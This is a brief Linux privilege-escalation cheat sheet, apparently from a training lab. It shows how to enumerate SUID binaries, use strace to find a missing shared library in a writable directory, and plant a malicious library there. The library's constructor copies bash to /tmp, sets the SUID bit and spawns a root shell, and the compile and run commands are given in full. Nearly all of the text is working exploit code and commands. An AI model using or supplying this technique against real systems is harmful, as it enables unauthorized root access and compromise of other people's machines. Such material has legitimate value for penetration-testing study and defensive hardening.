### View SUID Binaries
```
find / -type f -perm -04000 -ls 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
=A .so file is missing from a writable directory.
```
### Exploitation
```
mkdir /home/user/.config
cd /home/user/.config
nano /home/user/.config/libcalc.c

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
#id
#whoami
